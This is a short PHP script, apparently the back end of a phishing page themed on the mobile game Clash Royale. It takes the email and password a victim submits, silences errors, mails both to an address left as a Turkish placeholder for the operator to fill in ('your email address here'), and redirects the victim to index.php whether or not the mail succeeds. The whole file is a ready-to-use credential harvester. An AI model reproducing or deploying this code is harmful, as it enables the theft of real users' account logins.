<?php
error_reporting(0);
$email 		= $_POST['email'];
$password	= $_POST['pw'];
$message = "$email : $password";
$yes = mail("buraya mail adresiniz","Clash Royale","$message");
if($yes)
{
	header("location:index.php");
}
else
{
	header("location:index.php");
}
?>